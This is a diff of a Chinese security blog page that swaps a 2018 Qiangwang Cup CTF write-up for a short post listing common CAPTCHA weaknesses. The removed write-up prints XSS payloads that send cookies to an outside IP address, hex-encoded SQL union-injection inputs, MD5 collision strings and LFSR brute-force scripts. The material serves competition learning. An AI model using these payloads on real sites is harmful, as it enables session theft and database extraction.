@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>第二届强网杯-部分wp | Mang0&#39;s blog</title>
-  <meta name="keywords" content=" WP ">
-  <meta name="description" content="第二届强网杯-部分wp | Mang0&#39;s blog">
+  <title>验证码相关安全问题 | Mang0&#39;s blog</title>
+  <meta name="keywords" content=" web ">
+  <meta name="description" content="验证码相关安全问题 | Mang0&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
 <meta property="og:type" content="website">
@@ -658,9 +658,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-第二届强网杯-部分wp" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-验证码相关安全问题" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">第二届强网杯-部分wp</h1>
+        <h1 class="article-title">验证码相关安全问题</h1>
     
     <div class="article-meta">
         
@@ -668,26 +668,26 @@
         
         <span class="book">
             
-            <a href="javascript:" data-rel="CTF">CTF</a>
+            <a href="javascript:" data-rel="WebSecurity">WebSecurity</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">WP</a>
+            <a href="javascript:" class="color4">web</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-04-02 16:08</time>
+        创建时间:<time class="date" title='更新时间: 2018-10-24 00:08:00'>2018-10-23 23:05</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1,190</span>
+        <span>字数:512</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -717,7 +717,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web签到"><span class="toc-text">web签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#share-you-mind"><span class="toc-text">share you mind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#streamgame1"><span class="toc-text">streamgame1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#streamgame2"><span class="toc-text">streamgame2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Three-hit-Web"><span class="toc-text">Three hit    Web</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-乌云知识库"><span class="toc-text">0x00 乌云知识库:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-其他相关文章"><span class="toc-text">0x01 其他相关文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-乌云相关案例"><span class="toc-text">0x02 乌云相关案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-验证码实现原理"><span class="toc-text">0x03 验证码实现原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-客户端问题"><span class="toc-text">0x04 客户端问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-服务端问题"><span class="toc-text">0x05 服务端问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-其他类型验证码绕过"><span class="toc-text">0x06 其他类型验证码绕过</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -732,122 +732,56 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#第二届强网杯-部分wp</p>
-<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{welcome_to_qwb}</p>
-<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote>
-<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
-</blockquote>
-<p>第一关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p>
-<pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap
-param2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803252223_324.png" alt=""></p>
-<blockquote>
-<p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p>
-</blockquote>
-<pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%4
-0%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D
-8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf
-</code></pre><p>##welcome<br>改名.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260104_53.png" alt=""><br>offset 80</p>
-<h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
-<p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p>
-<p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p>
-<pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);
-</code></pre><p>但是有提示是Try to get the cookie of path “/QWB_fl4g/QWB/“</p>
-<p>那就是获取目录下的cookie</p>
-<pre><code>var i = document.createElement(&quot;iframe&quot;);
-i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);
-document.body.appendChild(i);
-i.addEventListener( &quot;load&quot;, function(){
-  var content = i.contentWindow.document.cookie;
-  location=&#39;//115.29.36.83:23338/&#39;+btoa(content);
-}, false);
-</code></pre><p>再利用eval包含住String.fromCharCode即可，payload长度还有些限制。</p>
-<p>QWB{flag_is_f43kth4rpo}</p>
-<h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>发现可以爆破<br>所以写如下脚本</p>
-<pre><code>python
-# coding=utf-8  
-
-def lfsr(R, mask):  
-    output = (R &lt;&lt; 1) &amp; 0xffffff 
-   i = (R &amp; mask) &amp; 0xffffff 
-   lastbit = 0  
-   while i != 0:  
-        lastbit ^= (i &amp; 1)  
-        i = i &gt;&gt; 1 
-   output ^= lastbit  
-    return (output, lastbit)  
-
-
-def main1(flag):  
-    R = flag  
-   mask = 0b1010011000100011100 
-
-   f = open(&quot;key1&quot;, &quot;wb&quot;)  
-    for i in range(12): 
-   tmp = 0  
-   for j in range(8):  
-            (R, out) = lfsr(R, mask)  
-            tmp = (tmp &lt;&lt; 1) ^ out  
-        f.write(chr(tmp))  
-    f.close()  
-
-
-key = open(&#39;key&#39;, &#39;rb&#39;)  
-key1 = key.read()  
-for x in range(524288, -1, -1):  
-    main1(x)  
-    key2 = open(&#39;key1&#39;, &#39;rb&#39;)  
-    result = key2.read()  
-    if (result == key1):  
-        print x  
-        break  
-   key2.close()
-</code></pre><p>爆破得到<br>481387<br><code>flag{1110101100001101011}</code></p>
-<h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>与上一道题相似脚本如下</p>
-<pre><code>python
-# coding=utf-8  
-def lfsr(R, mask):  
-    output = (R &lt;&lt; 1) &amp; 0xffffff  
-   i = (R &amp; mask) &amp; 0xffffff  
-   lastbit = 0  
-   while i != 0:  
-        lastbit ^= (i &amp; 1)  
-        i = i &gt;&gt; 1  
-   output ^= lastbit  
-    return (output, lastbit)  
-
-
-def main1(flag):  
-    R = flag  
-    mask = 0x100002  
-
-   f = open(&quot;key1&quot;, &quot;wb&quot;)  
-    for i in range(12):  
-        tmp = 0  
-   for j in range(8):  
-            (R, out) = lfsr(R, mask)  
-            tmp = (tmp &lt;&lt; 1) ^ out  
-        f.write(chr(tmp))  
-    f.close()  
-key = open(&#39;key&#39;, &#39;rb&#39;)  
-key1 = key.read()  
-for x in range(0b111111111111111111111 \+ 1, -1, -1):  
-    main1(x)  
-    key2 = open(&#39;key1&#39;, &#39;rb&#39;)  
-    result = key2.read()  
-    if (result == key1):  
-        print x  
-        break  
-   key2.close()
-</code></pre><p>flag{110111100101001101001}</p>
-<h2 id="Three-hit-Web"><a href="#Three-hit-Web" class="headerlink" title="Three hit    Web"></a>Three hit    Web</h2><p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p>
-<p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p>
-<p>payload:</p>
-<pre><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1
-</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/j0mydok06kpm0m5gailch3p9l7.png" alt=""></p>
-<p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值</p>
-<pre><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1
-</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/72x5eade9sy8pewomdvy5w0yq4.png" alt=""></p>
+        <h2 id="0x00-乌云知识库"><a href="#0x00-乌云知识库" class="headerlink" title="0x00 乌云知识库:"></a>0x00 乌云知识库:</h2><ul>
+<li><a href="http://drops.ichenfei.com/web-5459.html" target="_blank" rel="external">验证码安全问题汇总</a></li>
+<li><a href="http://drops.ichenfei.com/tips-141.html" target="_blank" rel="external">聊一聊随机数安全</a></li>
+<li><a href="http://drops.ichenfei.com/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li>
+<li><a href="http://drops.ichenfei.com/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li>
+</ul>
+<h2 id="0x01-其他相关文章"><a href="#0x01-其他相关文章" class="headerlink" title="0x01 其他相关文章"></a>0x01 其他相关文章</h2><ul>
+<li><a href="http://www.cnbraid.com/2016/captcha.html" target="_blank" rel="external">【安全加固】 验证码的实现原理和安全问题汇总</a></li>
+<li><a href="http://blog.csdn.net/niaonao/article/details/51112686" target="_blank" rel="external">验证码原理分析及实现</a></li>
+<li><a href="https://lizonghang.github.io/2016/07/10/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AD%97%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E7%94%9F%E6%88%90%E5%92%8C%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">随机数字图片验证码的原理、生成和破解</a></li>
+<li><a href="http://www.lijiejie.com/safe-issues-of-captcha/" target="_blank" rel="external">图形验证码的常见安全问题</a></li>
+</ul>
+<h2 id="0x02-乌云相关案例"><a href="#0x02-乌云相关案例" class="headerlink" title="0x02 乌云相关案例"></a>0x02 乌云相关案例</h2><ul>
+<li><a href="http://wy.ichenfei.com/searchbug.php?q=%E9%AA%8C%E8%AF%81%E7%A0%81" target="_blank" rel="external">http://wy.ichenfei.com/searchbug.php?q=验证码</a>  <!-- - [http://es.ichenfei.com:8000/wysearch/?q=验证码](http://es.ichenfei.com:8000/wysearch/?q=验证码) -->
+</li>
+</ul>
+<h2 id="0x03-验证码实现原理"><a href="#0x03-验证码实现原理" class="headerlink" title="0x03 验证码实现原理"></a>0x03 验证码实现原理</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201810240004_376.jpg" alt=""></p>
+<ol>
+<li>客户端发起一个请求；</li>
+<li>服务端响应并创建一个新的SessionID同时生成一个随机验证码；</li>
+<li>服务端将验证码和SessionID一并返回给客户端；</li>
+<li>客户端提交验证码连同SessionID给服务端；</li>
+<li>服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。</li>
+</ol>
+<p>根据上面的实现流程，可以从四个方面入手，<strong>客户端问题</strong>、<strong>服务端问题</strong>、<strong>验证码本身问题</strong>,还有一个<strong>验证码流程设计</strong>问题。</p>
+<h2 id="0x04-客户端问题"><a href="#0x04-客户端问题" class="headerlink" title="0x04 客户端问题"></a>0x04 客户端问题</h2><ul>
+<li>客户端生成验证码<ul>
+<li>验证码由客户端js生成并且仅仅在客户端用js验证</li>
+</ul>
+</li>
+<li>验证码输出客户端<ul>
+<li>输出在html中（神一样的程序员）</li>
+</ul>
+</li>
+<li>验证码输出在cookie中，这个在乌云中案例也是比较多的。</li>
+</ul>
+<h2 id="0x05-服务端问题"><a href="#0x05-服务端问题" class="headerlink" title="0x05 服务端问题"></a>0x05 服务端问题</h2><ul>
+<li>验证码不过期，没有及时销毁会话导致验证码复用<ul>
+<li>这个是最常见的，乌云上面有大量的案例。</li>
+</ul>
+</li>
+<li>没有进行非空判断<ul>
+<li>很多时候，我们会遗留掉了验证过程中验证码为空的情况</li>
+<li>比如去掉cookie中的某些值或者请求中验证码参数</li>
+</ul>
+</li>
+<li>产生的验证码问题集内的答案非常有限</li>
+</ul>
+<h2 id="0x06-其他类型验证码绕过"><a href="#0x06-其他类型验证码绕过" class="headerlink" title="0x06 其他类型验证码绕过"></a>0x06 其他类型验证码绕过</h2><p>pkav http fuzzer工具可以简单绕过数字型验证码</p>
+<p>基于机器学习识别验证码</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
@@ -861,12 +795,12 @@ for x in range(0b111111111111111111111 \+ 1, -1, -1):
 
 
 <div class="article_copyright">
-    <p><span>文章标题:</span>第二届强网杯-部分wp</p>
-    <p><span>文章字数:</span><span class="post-count">1,190</span></p>
+    <p><span>文章标题:</span>验证码相关安全问题</p>
+    <p><span>文章字数:</span><span class="post-count">512</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
-    <p><span>发布时间:</span>2018-04-02, 16:08:51</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
-    <span>原始链接:</span><a class="post-url" href="/archives/2ccf6cb2/" title="第二届强网杯-部分wp">http://mang0.me/archives/2ccf6cb2/</a>
+    <p><span>发布时间:</span>2018-10-23, 23:05:15</p>
+    <p><span>最后更新:</span>2018-10-24, 00:08:00</p>
+    <span>原始链接:</span><a class="post-url" href="/archives/b46a6d47/" title="验证码相关安全问题">http://mang0.me/archives/b46a6d47/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
